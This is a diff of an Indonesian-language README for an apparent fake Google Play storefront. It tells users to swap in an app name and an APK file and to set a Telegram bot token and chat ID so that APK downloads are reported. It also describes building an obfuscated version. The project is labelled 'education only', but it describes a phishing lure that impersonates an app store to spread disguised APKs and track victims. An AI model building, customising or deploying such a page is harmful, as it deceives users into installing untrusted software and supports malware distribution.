@@ -45,25 +45,40 @@ Tujuan utama:
 
 ---
 
-## 🧰 **Instalasi & Setup**  
+## 🧰 **Instalasi & Setup**
+
 1. Clone repo:  
    git clone https://github.com/raghid-setiawan/google-play-clone.git  
-   cd google-play-clone  
+   cd google-play-clone
 
-2. Install dependencies:  
-   npm install  
+2. **Ganti placeholder wajib (EDUKASI ONLY - lakukan untuk test lokal SAJA)**  
+   - **index.html**  
+     Cari teks **Huggle: Free Video Call** → ganti jadi nama APK kamu sendiri (misal: "My Test App v1.0")  
 
-3. Setup Telegram Bot (EDUKASI ONLY):  
-   - Buka file js/app.js  
-   - Cari baris:  
-     const TG_TOKEN = '';//YOUR BOT TOKEN  
-     const TG_CHAT = '';//YOUR CHAT ID  
-   - Ganti nilai di dalam '' dengan token & chat ID milikmu sendiri **untuk test lokal SAJA**  
-   - Setelah test selesai, kembalikan ke '' sebelum commit/push!
+   - **js/app.js**  
+     - Ubah pesan notif: `await sendTelegram('User started APK download');` → bisa diganti lebih spesifik (contoh: `'Download dimulai: nama-apk.apk'`)  
+     - Ubah link download: `link.href = 'https://t.me/Sec_Society';` → ganti jadi `'apk/nama-file-kamu.apk'` (direct dari folder apk/) atau link eksternal lain  
+     - Ubah nama file download: `link.download = 'test.apk';` → ganti jadi nama file APK asli (misal: `'my-app-v1.apk'`)  
 
+   - **Setup Telegram Bot**  
+     Buka file **js/app.js**  
+     Cari baris:  
+     `const TG_TOKEN = '';//YOUR BOT TOKEN`  
+     `const TG_CHAT = '';//YOUR CHAT ID`  
+     Ganti nilai di dalam '' dengan token & chat ID milikmu sendiri **untuk test lokal SAJA**  
+     Setelah test selesai, **kembalikan ke ''** sebelum commit/push!
+
+3. Install dependencies:  
+   npm install
+
+**Catatan penting:**  
+- Semua penggantian di langkah 2 hanya untuk eksperimen pribadi  
+- **Jangan commit** token, link, atau nama file asli ke repo  
+- Kembalikan semua placeholder ke nilai awal sebelum push
+  
 ---
 
-## 🛠 **Build Project**  
+## 🛠 **Build Project**
 Jalankan perintah berikut untuk membangun versi obfuscated:  
 npm run build  
 
@@ -71,9 +86,9 @@ Proses build akan menghasilkan folder dist/ yang berisi file-file sudah diobfusc
 Contoh output terminal yang sukses:  
 Build complete. See dist/ for obfuscated output.  
 
-Berikut screenshot proses build, struktur folder, kode konfigurasi Telegram, dan preview halaman di browser:  
+Screenshot proses build, struktur folder, kode konfigurasi Telegram, dan preview halaman di browser:  
 
-![Screenshot Build Process & Project Overview](./img/screenshot-build-vscode.png)  
+![Screenshot Build Process & Project Overview](https://i.imgur.com/Mm3BXzT.jpeg)
 *(Gambar menampilkan VS Code dengan app.js, terminal npm run build sukses, struktur folder, dan preview Google Play clone di browser)*
 
 Test lokal setelah build:  
